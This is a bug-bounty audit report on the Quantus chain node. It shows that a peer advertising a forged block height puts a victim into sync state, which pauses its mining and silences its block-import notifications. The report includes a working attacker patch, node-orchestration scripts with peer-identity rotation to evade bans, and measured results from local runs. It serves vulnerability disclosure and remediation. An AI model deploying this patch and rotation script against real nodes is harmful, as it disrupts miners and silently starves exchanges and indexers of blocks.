# 88224 bc medium a peer advertising a forged block height suspends a victim node s mining and silently blackholes its block import notifications

**Submitted on Aug 12th 2026 at 09:57:53 UTC by @shadowHunter for** [**Audit Comp | Quantus**](https://immunefi.com/audit-competition/audit-comp-quantus)

* **Report ID:** #88224
* **Report Type:** Blockchain/DLT
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-quantus-chain>
* **Impacts:**
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

### 1. Summary

The block-announces handshake carries a peer's claimed `best_number` and `best_hash`. The receiving node inserts that claimed height into `ChainSync` **before validating any header or any cumulative work**. `median_seen()` then reports the median of all peers' claimed heights, and if that median is more than five blocks ahead the node enters major-sync state. The QPoW mining loop declines to propose while the sync oracle reports major syncing.

With one attacker peer and no honest peers, the median is simply the attacker's lie. Measured result: the victim entered `⚙️ Syncing … target=#1000000`, logged 22 `Mining paused: node is still syncing with network` events, and produced **14 blocks in 120 seconds against a baseline of \~102**.

### 2. Description

#### 2.1 Claimed height is trusted before validation

The handshake is validated for encoding and genesis hash, then the claimed height is recorded:

* `client/network-sync/src/engine.rs:856-897` — handshake decode/validation
* `client/network-sync/src/strategy/chain_sync.rs:1049-1144` — peer inserted with its claimed `best_number`

No header for the claimed tip is required, and no cumulative work is checked, before the number is used.

#### 2.2 The median is the upper median

```rust
// client/network-sync/src/strategy/chain_sync.rs:1573-1585
fn median_seen(&self) -> Option<NumberFor<B>> {
    let mut best_seens = self.peers.values().map(|p| p.best_number).collect::<Vec<_>>();

    if best_seens.is_empty() {
        None
    } else {
        let middle = best_seens.len() / 2;

        // Not the "perfect median" when we have an even number of peers.
        Some(*best_seens.select_nth_unstable(middle).1)
    }
}
```

For an even peer count, index `len / 2` is the **upper** median, which favours the higher-claiming side. With `n` honest peers, `n` attacker peers suffice.

#### 2.2b Major-sync state ALSO suppresses block-import notifications

This is the second, larger consequence, and it affects nodes that never mine.

While `is_major_syncing()` is true, imported blocks are labelled with a different origin:

```rust
// client/network-sync/src/strategy/chain_sync.rs:1618
let origin = if !gap && !self.status().state.is_major_syncing() {
    BlockOrigin::NetworkBroadcast
} else {
    BlockOrigin::NetworkInitialSync
};
```

and that origin decides whether any import notification is emitted at all:

```rust
// client/service/src/client/client.rs:589-593
let make_notifications = match origin {
    BlockOrigin::NetworkBroadcast | BlockOrigin::Own | BlockOrigin::ConsensusBroadcast => true,
    BlockOrigin::Genesis | BlockOrigin::NetworkInitialSync | BlockOrigin::File => false,
};
```

So every consumer of the import-notification stream — `chain_subscribeNewHeads`, `chain_subscribeFinalizedHeads`, the transaction pool's maintenance signal, and the node's own informant — receives nothing, while the node continues importing normally. Nothing in the node's status output indicates that subscribers are being starved.

A third effect, verified in code but not separately measured: download parallelism collapses while in this state.

```rust
// client/network-sync/src/strategy/chain_sync.rs:1890
let max_parallel = if is_major_syncing { 1 } else { self.max_parallel_downloads };
```

#### 2.3 Mining stops while the sync oracle reports major syncing

```rust
// node/src/service.rs:341-349
// Don't mine if we're still syncing
if sync_service.is_major_syncing() {
    log::debug!(target: "pow", "Mining paused: node is still syncing with network");
    tokio::select! {
        _ = tokio::time::sleep(Duration::from_secs(5)) => {}
        _ = cancellation_token.cancelled() => continue
    }
    continue;
}
```

Note this check sits **before** the zero-peer guard, and `--force-authoring` does **not** bypass it: that flag only sets `allow_mining_without_peers`, which gates the separate `is_offline()` branch at `service.rs:351`. A miner using `--force-authoring` is still subject to this pause.

#### 2.4 Peer slots make the multi-peer case cheap

```rust
// client/cli/src/params/network_params.rs:97-103
#[arg(long, value_name = "COUNT", default_value_t = 8)]
pub out_peers: u32,          // outbound — typically honest

#[arg(long, value_name = "COUNT", default_value_t = 32)]
pub in_peers: u32,           // inbound — attacker-fillable
```

Occupying inbound slots is not the same as eclipsing a node. With 8 honest outbound peers and up to 32 attacker-supplied inbound peers, controlling the median does not require displacing anyone.

### 3. Steps to reproduce

{% stepper %}
{% step %}

## A miner is running normally

Any reachable QPoW validator. In the measurement below it produces \~51 blocks/minute at the reduced test difficulty.
{% endstep %}

{% step %}

## An attacker connects one peer and asserts a false height

The peer completes an ordinary handshake but advertises a `best_number` far ahead of reality. It mines nothing, serves nothing, and holds no funds:

```
QPOC_FAKE_HEIGHT: advertising 71 + 1000000 instead of real height
```

{% endstep %}

{% step %}

## The victim records the claim without validating it

The claimed height enters `ChainSync` before any header or work check (§2.1).
{% endstep %}

{% step %}

## The median becomes the lie, and the node declares itself syncing

```
⚙️  Syncing  0.6 bps, target=#1000000 (1 peers), best: #65
```

The victim is now "syncing" toward a block that does not exist.
{% endstep %}

{% step %}

## Mining stops

```
DEBUG pow: Mining paused: node is still syncing with network
```

Repeated every 5 seconds for the duration.
{% endstep %}

{% step %}

## The victim eventually recovers, unaided

After roughly 111 seconds the node stops believing the peer, `target` falls back to its own height, and block production returns to baseline — **even though the attacker remains connected and continues to advertise the forged height**. This is the honest limit of the finding.
{% endstep %}
{% endstepper %}

### 4. Impact

**What is demonstrated:** an unauthenticated peer, at essentially zero cost and with no proof-of-work, suspends a specific miner's block production for \~111 seconds. On a chain targeting 12-second blocks that is roughly **9 blocks of lost revenue** per attempt for the targeted miner. The victim's own `--force-authoring` flag does not protect it.

The asymmetry is the point: the attacker sends one integer in a handshake field. The victim stops doing the thing the network pays it for.

#### 4b. The notification blackout (measured separately, §6.7)

A **non-mining** victim, syncing legitimately from an honest miner, was subjected to the same forged-height attack:

| Segment    | Duration | Victim imported         | Notifications delivered | `isSyncing`                      |
| ---------- | -------: | ----------------------- | ----------------------- | -------------------------------- |
| Baseline   |     49 s | #44 → #70 (27 blocks)   | **27**                  | false                            |
| **Attack** |    112 s | #70 → #129 (59 blocks)  | **0 for 101.0 s**       | **true**, `highestBlock=1000000` |
| Recovery   |     84 s | #135 → #188 (53 blocks) | **54**                  | false                            |

Notification #38 delivered block 81; notification #39 delivered block **134**, 101.0 seconds later. **Blocks 82–133 were never delivered at all.**

Independent in-node corroboration, which rules out any fault in the test client: the victim's own informant — a separate consumer of the same gated stream — printed **zero** `Imported #N` lines for blocks 82–133, while simultaneously reporting 20 distinct `best: #N` heights inside that same range. It knew it had those blocks; it just never announced them.

Counts from the victim's log:

| Block range           | `Imported` lines |
| --------------------- | ---------------: |
| 44–81 (before)        |               38 |
| **82–133 (blackout)** |            **0** |
| 134–188 (after)       |               55 |

**Why this matters more than the mining pause.** An exchange, indexer, or RPC provider driving off `chain_subscribeNewHeads` would silently miss 52 blocks. The node answers `system_health` normally, keeps importing, and logs nothing at `info` to indicate its subscribers are being starved. The failure is invisible from both sides: the operator sees a healthy node, and the consumer sees an idle chain.

**What is not demonstrated, and is explicitly not claimed:**

| Claim                                           | Status                                                               |
| ----------------------------------------------- | -------------------------------------------------------------------- |
| Miner pauses                                    | **Confirmed** (\~111s, 22 pause events)                              |
| Non-mining node's notifications blackholed      | **Confirmed** (101.0s, 52 heads lost)                                |
| Node keeps importing during the blackout        | **Confirmed** (block 70 → 129 while silent)                          |
| Failure is silent to operator and consumer      | **Confirmed** (`system_health` normal; nothing at `info`)            |
| Pause is permanent from ONE static peer         | **Refuted** — peer is hard-banned in \~30-45s; recovery follows      |
| Sustained via identity rotation                 | **Confirmed** — a fresh liar every \~38s held it; node keys are free |
| `finalizedHeads` / tx-pool channel also starved | **Not measured** — same code gate, but unverified                    |
| Network-wide halt                               | **Not claimed** — every prior chain-halt framing is unsupported      |
| Other nodes affected                            | **No** — each victim must be targeted individually                   |

**How these two effects combine into the rating.** Because the node self-heals, the **mining pause considered alone** is a nuisance-grade availability issue against an individual miner — not a consensus or liveness threat — and on its own it would not warrant more than Low. That was this report's original assessment.

The **Medium** rating rests on §4b instead: the notification blackout applies to *any* reachable node rather than only miners, destroys data rather than delaying it (the 52 intervening heads are never delivered, not queued), and is silent to the operator and the consumer simultaneously. A downstream exchange or indexer has no signal that it has stopped receiving blocks. Neither effect is a consensus or liveness threat, and neither is claimed to be.

**Why it is still worth fixing:** the underlying property is that *unverified metadata from an unauthenticated peer can suspend authoring*. The recovery is incidental — it happens because the lying peer fails to deliver blocks — rather than the result of any validation. A more careful attacker (one that also serves plausible headers, or that rotates identities as the victim loses confidence) is not obviously bounded by the same 111 seconds, and that possibility is exactly what the current design leaves open.

### 5. Recommendation

{% stepper %}
{% step %}

## Do not let unverified handshake metadata gate authoring

Count a peer's claimed height toward sync state only after receiving a header for that tip and validating its cumulative work.
{% endstep %}

{% step %}

## Bound per-peer influence on the median

Weight by network identity/address group so that inbound slots — which are free to occupy — cannot dominate outbound, established peers.
{% endstep %}

{% step %}

## Reject extreme outliers

A claimed height a million blocks beyond the local best, unaccompanied by any deliverable header, should be treated as evidence against the peer rather than as a sync target.
{% endstep %}

{% step %}

## Penalise peers that cannot deliver what they advertise

Recovery currently happens by accident; making it an explicit reputation consequence would also close the rotation avenue.
{% endstep %}

{% step %}

## Consider decoupling authoring from the sync oracle

For operators who have deliberately opted into `--force-authoring`, or document clearly that the flag does not cover this case.
{% endstep %}
{% endstepper %}

## Proof of Concept

### 6. Proof of concept

#### 6.1 Environment

|      |                                          |
| ---- | ---------------------------------------- |
| OS   | Ubuntu 24.04.1 LTS (WSL2 on Windows)     |
| CPU  | AMD Ryzen 7 5800H (12 cores), 9.9 GB RAM |
| Rust | 1.93.0 (pinned by `rust-toolchain`)      |

#### 6.2 Setup

```bash
git clone https://github.com/immunefi-team/audit-comp-quantus-chain quantus-chain
cd quantus-chain
git checkout audit-comp-ready      # 3b243b870a5442a6e5f443056f67bbba87d472f5 (in-scope commit)

rustup toolchain install 1.93.0
rustup target add wasm32v1-none --toolchain 1.93.0
apt-get install -y clang libclang-dev protobuf-compiler pkg-config libssl-dev cmake build-essential
export LIBCLANG_PATH=/usr/lib/llvm-18/lib   # Ubuntu 24.04: libclang is off the default path
```

**Build the VICTIM first, from pristine source:**

```bash
cargo build --release --locked -p quantus-node -j 6
mkdir -p ~/quantus-poc/bin
cp target/release/quantus-node ~/quantus-poc/bin/quantus-node-victim
```

A reduced-difficulty chain spec is used so blocks take \~1s instead of \~35s, making the effect measurable in minutes. This is a **supported chain-spec override** (`pallets/qpow/src/lib.rs:92-94`: *"Use the genesis config value, not the runtime constant. This allows chain-spec overrides of initial difficulty."*) and touches nothing in sync, mining, or peer handling:

The scripts in §6.4 and §6.7 both read the raw spec from `$HOME/quantus-poc/poc4-split/poc4-raw.json`, so build it at that path:

```bash
mkdir -p ~/quantus-poc/poc4-split
cd ~/quantus-poc/poc4-split

~/quantus-poc/bin/quantus-node-victim build-spec --chain dev --disable-default-bootnode > dev-spec.json
python3 - <<'EOF'
import json
d = json.load(open("dev-spec.json"))
d["genesis"]["runtimeGenesis"]["patch"]["qPoW"]["initialDifficulty"] = "0x20000"  # stock: 0x3d0900
d["name"] = "Quantus PoC Split"; d["id"] = "qpoc4"
json.dump(d, open("poc4-spec.json", "w"), indent=2)
EOF
~/quantus-poc/bin/quantus-node-victim build-spec --chain poc4-spec.json --raw --disable-default-bootnode > poc4-raw.json
~/quantus-poc/bin/quantus-node-victim key quantus --scheme wormhole    # use the "Inner Hash"
```

The scripts also read the checked-out source from `$HOME/quantus-poc/chain` to print the code under test. Either clone there, or symlink the working tree:

```bash
ln -s "$(pwd)" ~/quantus-poc/chain     # run from the repository root
```

#### 6.3 The attacker instrumentation

Applied **only** to the attacker binary, gated behind `QPOC_FAKE_HEIGHT`; with the variable unset the code is byte-for-byte stock. It inflates the `best_number` advertised in the block-announces handshake at both construction sites — the initial one baked into the protocol config, and the refresh on every new best block.

Save as `poc7_attacker.diff` and apply with `git apply poc7_attacker.diff`:

```diff
--- a/client/network-sync/src/engine.rs
+++ b/client/network-sync/src/engine.rs
@@ -709,12 +709,22 @@
 			ToServiceCommand::NewBestBlockImported(hash, number) => {
 				log::debug!(target: LOG_TARGET, "New best block imported {:?}/#{}", hash, number);
 
 				self.strategy.update_chain_info(&hash, number);
+				// PoC ATTACKER INSTRUMENTATION: advertise a forged height.
+				let qpoc_number = match std::env::var("QPOC_FAKE_HEIGHT") {
+					Ok(v) => {
+						let bump: u32 = v.parse().unwrap_or(1_000_000);
+						log::warn!(target: LOG_TARGET,
+							"QPOC_FAKE_HEIGHT: advertising {:?} + {} instead of real height", number, bump);
+						sp_runtime::traits::Saturating::saturating_add(number, bump.into())
+					},
+					Err(_) => number,
+				};
 				let _ = self.notification_service.try_set_handshake(
 					BlockAnnouncesHandshake::<B>::build(
 						self.roles,
-						number,
+						qpoc_number,
 						hash,
 						self.genesis_hash,
 					)
 					.encode(),
 				);
 			},
@@ -1152,7 +1162,12 @@
 			Some(NotificationHandshake::new(BlockAnnouncesHandshake::<B>::build(
 				roles,
-				best_number,
+				// PoC ATTACKER INSTRUMENTATION: forged initial height.
+				match std::env::var("QPOC_FAKE_HEIGHT") {
+					Ok(v) => sp_runtime::traits::Saturating::saturating_add(best_number, v.parse::<u32>().unwrap_or(1_000_000).into()),
+					Err(_) => best_number,
+				},
 				best_hash,
 				genesis_hash,
 			))),
```

```bash
cargo build --release --locked -p quantus-node -j 6
cp target/release/quantus-node ~/quantus-poc/bin/quantus-node-attacker7
```

**Why this does not weaken the result.** The patch changes only what the *attacker* advertises about itself — precisely what a hostile peer with a custom client would send. The victim binary is pristine and was built before the patch existed. Nothing in the patch touches how the victim validates, medians, or decides to mine.

#### 6.4 The experiment

Save as `poc7_run.sh`. It measures a baseline with no attacker, then attaches one forged-height peer and samples per-interval block deltas.

```bash
#!/usr/bin/env bash
set -uo pipefail
BIN="$HOME/quantus-poc/bin"
VICTIM="$BIN/quantus-node-victim"; ATTACKER="$BIN/quantus-node-attacker7"
OUT="$HOME/quantus-poc/poc7-height/out"; SPEC="$HOME/quantus-poc/poc4-split/poc4-raw.json"
INNER=0xf5cae0888f92cfba08c41c140b21f1ff40340c46dc487aa2754b4e752028598d
V_P2P=30601; V_RPC=9955; V_PATH=/tmp/qpoc7-victim
A_P2P=30602; A_RPC=9956; A_PATH=/tmp/qpoc7-attacker
FAKE_BUMP="${FAKE_BUMP:-1000000}"; BASELINE_SECS="${BASELINE_SECS:-60}"; ATTACK_SECS="${ATTACK_SECS:-180}"
mkdir -p "$OUT"; rm -rf "$V_PATH" "$A_PATH" 2>/dev/null

rpc() { curl -s -H "Content-Type: application/json" \
        --data "{\"jsonrpc\":\"2.0\",\"method\":\"$2\",\"params\":[],\"id\":1}" "http://127.0.0.1:$1"; }
jq_() { python3 -c "import sys,json
try:
    d=json.load(sys.stdin); v=d
    for k in sys.argv[1].split('.'): v=v[k]
    print(v)
except Exception: print('')" "$1" 2>/dev/null; }

echo '### code under test (victim source)'
sed -n '1573,1585p' "$HOME/quantus-poc/chain/client/network-sync/src/strategy/chain_sync.rs"
sed -n '341,349p' "$HOME/quantus-poc/chain/node/src/service.rs"

echo '### PHASE 1 - victim mines alone (BASELINE)'
RUST_LOG=info,pow=debug "$VICTIM" --chain "$SPEC" --base-path "$V_PATH" --port "$V_P2P" --rpc-port "$V_RPC" \
  --no-mdns --no-telemetry --no-prometheus \
  --validator --force-authoring --unsafe-force-node-key-generation \
  --rewards-inner-hash "$INNER" --name VICTIM > "$OUT/victim.log" 2>&1 &
V_PID=$!; A_PID=0
trap 'kill $V_PID $A_PID 2>/dev/null; wait 2>/dev/null' EXIT
for i in $(seq 1 90); do (echo > /dev/tcp/127.0.0.1/$V_RPC) 2>/dev/null && break; sleep 1; done
sleep 5
V_PEER=$(rpc $V_RPC system_localPeerId | jq_ result)
B0=$(rpc $V_RPC system_syncState | jq_ result.currentBlock)
sleep "$BASELINE_SECS"
B1=$(rpc $V_RPC system_syncState | jq_ result.currentBlock)
echo "    baseline: +$((B1-B0)) blocks in ${BASELINE_SECS}s"

echo "### PHASE 2 - ONE attacker peer joins, advertising height +${FAKE_BUMP}"
QPOC_FAKE_HEIGHT=$FAKE_BUMP RUST_LOG=info "$ATTACKER" --chain "$SPEC" --base-path "$A_PATH" \
  --port "$A_P2P" --rpc-port "$A_RPC" --no-mdns --no-telemetry --no-prometheus \
  --unsafe-force-node-key-generation --name ATTACKER \
  --bootnodes "/ip4/127.0.0.1/tcp/$V_P2P/p2p/$V_PEER" \
  --reserved-nodes "/ip4/127.0.0.1/tcp/$V_P2P/p2p/$V_PEER" > "$OUT/attacker.log" 2>&1 &
A_PID=$!
for i in $(seq 1 60); do (echo > /dev/tcp/127.0.0.1/$A_RPC) 2>/dev/null && break; sleep 1; done

echo "### PHASE 3 - observing ${ATTACK_SECS}s"
A0=$(rpc $V_RPC system_syncState | jq_ result.currentBlock); PREV=$A0
printf "    %-7s %-9s %-8s %-10s %-11s %-8s %s\n" t block d_blk isSyncing peers paused target
for t in $(seq 1 $((ATTACK_SECS/15))); do
  sleep 15
  BB=$(rpc $V_RPC system_syncState | jq_ result.currentBlock)
  HB=$(rpc $V_RPC system_syncState | jq_ result.highestBlock)
  SY=$(rpc $V_RPC system_health | jq_ result.isSyncing)
  PR=$(rpc $V_RPC system_health | jq_ result.peers)
  PA=$(grep -c "Mining paused" "$OUT/victim.log")
  printf "    %-7s %-9s %-8s %-10s %-11s %-8s %s\n" "$((t*15))s" "$BB" "+$((BB-PREV))" "$SY" "$PR" "$PA" "$HB"
  PREV=$BB
done
echo "### pause events: $(grep -c 'Mining paused' "$OUT/victim.log")"
grep 'Mining paused' "$OUT/victim.log" | head -1
grep 'Mining paused' "$OUT/victim.log" | tail -1
grep 'Syncing' "$OUT/victim.log" | head -1
grep 'QPOC_FAKE_HEIGHT' "$OUT/attacker.log" | tail -1
```

#### 6.5 PoC output

**Baseline (no attacker):** `+51 blocks in 60s`

**Per-interval, with one forged-height peer attached:**

```
    t       block     d_blk    isSyncing  peers       paused   target
    15s     65        +9       True       1           2        1000000
    30s     65        +0       True       1           5        1000000
    45s     65        +0       True       1           8        1000000
    60s     65        +0       True       1           11       1000000
    75s     70        +5       True       1           13       1000000
    90s     70        +0       True       1           16       1000000
    105s    70        +0       True       1           19       1000000
    120s    70        +0       True       1           22       1000000
    135s    83        +13      False      1           83
    150s    99        +16      False      1           99
    165s    111       +12      False      1           111
    180s    121       +10      False      1           121
```

**The victim's own log — it adopted the forged height and stopped mining:**

```
2026-08-11 14:44:13 INFO  substrate: ⚙️  Syncing  0.6 bps, target=#1000000 (1 peers), best: #65
2026-08-11 14:44:10 DEBUG pow: Mining paused: node is still syncing with network
   ... 22 occurrences ...
2026-08-11 14:46:01 DEBUG pow: Mining paused: node is still syncing with network
```

**And the recovery, with the attacker still connected and still lying:**

```
2026-08-11 14:47:03 INFO  substrate: 💤 Idle (1 peers), best: #118
2026-08-11 14:47:04 WARN  QPOC_FAKE_HEIGHT: advertising 121 + 1000000 instead of real height
```

#### 6.6 Explanation of the output

**`target=#1000000` is the finding in one line.** That value is the attacker's forged bump. The victim abandoned block production to chase a block that does not exist, on the word of a peer that supplied no header, no work, and no evidence of any kind.

**The pause is real and measured, not inferred.** 22 `Mining paused: node is still syncing with network` events spanning 14:44:10–14:46:01 (\~111 seconds), with `d_blk = +0` across four consecutive 15-second intervals in the middle of the window. Baseline over the same duration would be \~102 blocks; the victim produced 14.

**Note the log level.** That pause message is emitted at `debug!`. An earlier run at `RUST_LOG=info` reported zero occurrences — not because the pause did not happen, but because the message could not be printed. The count is only evidence at `pow=debug`.

**The recovery is equally measured, and bounds the finding.** From t=135s the victim's `isSyncing` returns to `False`, `target` falls back to its real height, and block deltas return to baseline (+13, +16, +12, +10 ≈ 51/minute). The attacker is still connected (`peers=1`) and still advertising the lie at 14:47:04. The node therefore recovers by ceasing to trust a peer that cannot deliver, not by validating anything up front.

**Why the aggregate figure is misleading.** Averaged across the whole 180s window the result reads "21 blocks/min vs 51 baseline", which understates the effect during the pause and overstates it after recovery. The per-interval deltas are the meaningful measurement, which is why they are reported here rather than a single ratio.

#### 6.7 Second experiment — the notification blackout

This is a separate three-node experiment measuring the effect on a **non-mining** node. Same binaries, same chain spec, same setup as §6.2–6.3.

**Topology.** `H` an honest miner, `V` a non-validator victim with RPC enabled, and rotating liars `B1..B3` pointed only at `V`.

Two topology details are load-bearing:

* **`H` must be shielded from the liars.** On the first attempt the liars discovered `H` through `V`'s DHT and poisoned the miner too, which stopped block production and would have confounded the result. Pinning `H` with `--reserved-only` to `V` fixes it. In a real network an attacker *would* poison both, but shielding is what isolates the notification failure from the mining pause.
* **Liars must be rotated.** `V` hard-bans a peer that advertises blocks it cannot deliver within \~30–45 s. The experiment launches a fresh liar (fresh node key ⇒ fresh peer id) every \~38 s to sustain the window.

**Transport gotcha:** this build's litep2p listen addresses are `/ip4/…/tcp/PORT/ws/p2p/ID`. A bootnode multiaddr without the `/ws` segment silently fails to dial, with no log at `info`.

**The WebSocket subscriber** (`ws_sub.py`). A raw RFC6455 client, since `pip`/`websockets` were unavailable offline:

```python
#!/usr/bin/env python3
"""Minimal raw-socket RFC6455 WebSocket JSON-RPC subscriber for Substrate nodes.
Usage: ws_sub.py <host> <port> <duration_secs> <label> [method]"""
import socket, base64, os, struct, sys, time, json

def handshake(sock, host, port):
    key = base64.b64encode(os.urandom(16)).decode()
    req = ("GET / HTTP/1.1\r\n" f"Host: {host}:{port}\r\n" "Upgrade: websocket\r\n"
           "Connection: Upgrade\r\n" f"Sec-WebSocket-Key: {key}\r\n"
           "Sec-WebSocket-Version: 13\r\n" "Origin: http://127.0.0.1\r\n" "\r\n")
    sock.sendall(req.encode())
    buf = b""
    while b"\r\n\r\n" not in buf:
        chunk = sock.recv(4096)
        if not chunk: raise RuntimeError("server closed during handshake; got: %r" % buf)
        buf += chunk
    head, rest = buf.split(b"\r\n\r\n", 1)
    if b"101" not in head.split(b"\r\n")[0]: raise RuntimeError("handshake failed: %r" % head)
    return rest

def send_frame(sock, payload, opcode=0x1):
    data = payload.encode() if isinstance(payload, str) else payload
    mask = os.urandom(4)
    masked = bytes(b ^ mask[i % 4] for i, b in enumerate(data))
    n = len(data)
    hdr = bytes([0x80 | opcode])
    if n < 126:      hdr += bytes([0x80 | n])
    elif n < 65536:  hdr += bytes([0x80 | 126]) + struct.pack(">H", n)
    else:            hdr += bytes([0x80 | 127]) + struct.pack(">Q", n)
    sock.sendall(hdr + mask + masked)

class Reader:
    def __init__(self, sock, leftover=b""): self.sock, self.buf = sock, leftover
    def need(self, n):
        while len(self.buf) < n:
            chunk = self.sock.recv(65536)
            if not chunk: raise ConnectionError("closed")
            self.buf += chunk
    def take(self, n):
        self.need(n); out, self.buf = self.buf[:n], self.buf[n:]; return out
    def frame(self):
        b0, b1 = self.take(2)
        fin, opcode, masked, ln = (b0 & 0x80) != 0, b0 & 0x0F, (b1 & 0x80) != 0, b1 & 0x7F
        if ln == 126:   ln = struct.unpack(">H", self.take(2))[0]
        elif ln == 127: ln = struct.unpack(">Q", self.take(8))[0]
        mask = self.take(4) if masked else None
        payload = self.take(ln) if ln else b""
        if mask: payload = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
        return fin, opcode, payload
    def message(self):
        data, op = b"", None
        while True:
            fin, opcode, payload = self.frame()
            if opcode == 0x9: send_frame(self.sock, payload, opcode=0xA); continue
            if opcode == 0xA: continue
            if opcode == 0x8: raise ConnectionError("server sent close")
            if opcode in (0x1, 0x2): op, data = opcode, payload
            elif opcode == 0x0:      data += payload
            if fin: return op, data

def main():
    host, port, duration, label = sys.argv[1], int(sys.argv[2]), float(sys.argv[3]), sys.argv[4]
    method = sys.argv[5] if len(sys.argv) > 5 else "chain_subscribeNewHeads"
    s = socket.create_connection((host, port), timeout=10); s.settimeout(5)
    r = Reader(s, handshake(s, host, port))
    send_frame(s, json.dumps({"jsonrpc": "2.0", "id": 1, "method": method, "params": []}))
    t0 = time.time(); end = t0 + duration; count = 0; numbers = []
    while time.time() < end:
        s.settimeout(max(0.5, end - time.time()))
        try: op, data = r.message()
        except socket.timeout: continue
        except ConnectionError as e:
            print(f"[{label}] CONNECTION LOST after {time.time()-t0:.1f}s: {e}", flush=True); break
        txt = data.decode("utf-8", "replace")
        try: msg = json.loads(txt)
        except Exception: print(f"[{label}] non-json: {txt[:200]}", flush=True); continue
        if "result" in msg and msg.get("id") == 1:
            print(f"[{label}] t=+{time.time()-t0:6.1f}s SUBSCRIBED id={msg['result']}", flush=True); continue
        if msg.get("method", "").endswith("_newHead") or "params" in msg:
            count += 1; num = None
            try: num = int(msg["params"]["result"]["number"], 16); numbers.append(num)
            except Exception: pass
            print(f"[{label}] t=+{time.time()-t0:6.1f}s NOTIF #{count} block={num}", flush=True)
    print(f"[{label}] SUMMARY method={method} duration={time.time()-t0:.1f}s notifications={count} "
          f"first_block={numbers[0] if numbers else None} last_block={numbers[-1] if numbers else None}", flush=True)
    s.close()

if __name__ == "__main__": main()
```

**The experiment** (`recovery_run2.sh`) — baseline, attack and recovery under one continuous subscription:

```bash
#!/usr/bin/env bash
set -uo pipefail
POC="$HOME/quantus-poc/poc8-notify"; OUT="$POC/out2"; DATA="$POC/data"
BIN_V="$HOME/quantus-poc/bin/quantus-node-victim"
BIN_A="$HOME/quantus-poc/bin/quantus-node-attacker7"
SPEC="$HOME/quantus-poc/poc4-split/poc4-raw.json"
INNER=0xf5cae0888f92cfba08c41c140b21f1ff40340c46dc487aa2754b4e752028598d
mkdir -p "$OUT" "$DATA"; : > "$OUT/timeline.txt"
COMMON="--chain $SPEC --unsafe-force-node-key-generation --no-mdns --no-telemetry --no-prometheus"
say() { echo "$(date +%H:%M:%S) $*" >> "$OUT/timeline.txt"; }
kill_attackers() { ps -eo pid,comm | awk '$2=="quantus-node-at"{print $1}' | xargs -r kill; }
peerid() { grep -m1 -oE 'Local node identity is: [A-Za-z0-9]+' "$1" | awk '{print $NF}'; }

say "starting V (victim, NOT a validator, never mines)"
RUST_LOG=info,sync=debug setsid nohup "$BIN_V" $COMMON \
  --base-path "$DATA/V" --port 30702 --rpc-port 9932 --name V-victim > "$OUT/V.log" 2>&1 &
for i in $(seq 1 60); do V_ID=$(peerid "$OUT/V.log"); [ -n "${V_ID:-}" ] && break; sleep 1; done
V_WS="/ip4/127.0.0.1/tcp/30702/ws/p2p/$V_ID"; say "V_ID=$V_ID"

say "starting H (honest miner, reserved-only -> V so liars cannot reach it)"
RUST_LOG=info setsid nohup "$BIN_V" $COMMON \
  --base-path "$DATA/H" --port 30701 --rpc-port 9931 \
  --validator --force-authoring --rewards-inner-hash $INNER \
  --bootnodes "$V_WS" --reserved-nodes "$V_WS" --reserved-only \
  --name H-miner > "$OUT/H.log" 2>&1 &
sleep 75

setsid bash "$POC/poll.sh" 9932 250 "$OUT/V_poll.txt" &
setsid bash "$POC/poll.sh" 9931 250 "$OUT/H_poll.txt" &
setsid timeout 260 python3 "$POC/ws_sub.py" 127.0.0.1 9932 245 RUN2 > "$OUT/ws.txt" 2>&1 &

say "SEGMENT-A baseline begins (50s)"; sleep 50
say "SEGMENT-B attack begins (115s)"
for i in 1 2 3; do
  mkdir -p "$DATA/B$i"
  QPOC_FAKE_HEIGHT=1000000 RUST_LOG=info setsid nohup "$BIN_A" $COMMON \
    --base-path "$DATA/B$i" --port $((30720+i)) --rpc-port $((9960+i)) \
    --bootnodes "$V_WS" --reserved-nodes "$V_WS" \
    --name "B-liar-$i" > "$OUT/B$i.log" 2>&1 &
  say "  liar #$i launched"; sleep 38
done
kill_attackers; say "SEGMENT-C liars killed, recovery begins (80s)"; sleep 82; say "done"
```

`poll.sh`:

```bash
#!/usr/bin/env bash
PORT=$1; DUR=$2; OUTF=$3
END=$(( $(date +%s) + DUR ))
while [ "$(date +%s)" -lt "$END" ]; do
  SS=$(curl -s -m 4 -H 'Content-Type: application/json' --data '{"jsonrpc":"2.0","method":"system_syncState","params":[],"id":1}' http://127.0.0.1:$PORT)
  HE=$(curl -s -m 4 -H 'Content-Type: application/json' --data '{"jsonrpc":"2.0","method":"system_health","params":[],"id":1}' http://127.0.0.1:$PORT)
  echo "$(date +%H:%M:%S) syncState=$SS health=$HE" >> "$OUTF"
  sleep 5
done
```

**Output**

Subscriber, showing the blackout boundary and the resumption:

```
[RUN2] t=+   0.0s NOTIF #1 block=44
[RUN2] t=+   0.4s NOTIF #2 block=45
   ... continuous, one per block ...
[RUN2] t=+  59.8s NOTIF #38 block=81        <- last before the liars take effect
                                            <-- 101.0 SECONDS, ZERO NOTIFICATIONS -->
[RUN2] t=+ 160.8s NOTIF #39 block=134       <- resumes at the CURRENT head; 82..133 lost
[RUN2] t=+ 161.2s NOTIF #40 block=135
   ... continuous again ...
[RUN2] t=+ 244.1s NOTIF #93 block=188
[RUN2] SUMMARY method=chain_subscribeNewHeads duration=245.0s notifications=93 first_block=44 last_block=188
```

Victim in major sync while importing:

```
15:43:11.985 INFO substrate: ⚙️  Syncing  0.9 bps, target=#1000000 (2 peers), best: #82 (0x4d07…6994), finalized #0
15:43:16.986 INFO substrate: ⚙️  Syncing  0.2 bps, target=#1000000 (2 peers), best: #83 (0x1d80…7fbf), finalized #0
```

RPC concurred: `{"currentBlock":102,"highestBlock":1000000}`, `{"peers":3,"isSyncing":true}`.

The honest miner never stopped (control):

```
15:42:57 H cur=70  peers=1 syncing=false
15:43:37 H cur=91  peers=1 syncing=false
15:44:36 H cur=124 peers=1 syncing=false
```

The ban that forces rotation:

```
ReputationChange { value: -536870912, reason: "Not requested block data" }   (x5)
```

#### Independent verification of the key result

The strongest evidence is not the WebSocket client at all — it is the victim's **own informant**, a separate consumer of the same gated stream. Counting `Imported #N` lines in `V.log` by block range:

| Block range           | `Imported` lines |
| --------------------- | ---------------: |
| 44–81 (before)        |               38 |
| **82–133 (blackout)** |            **0** |
| 134–188 (after)       |               55 |

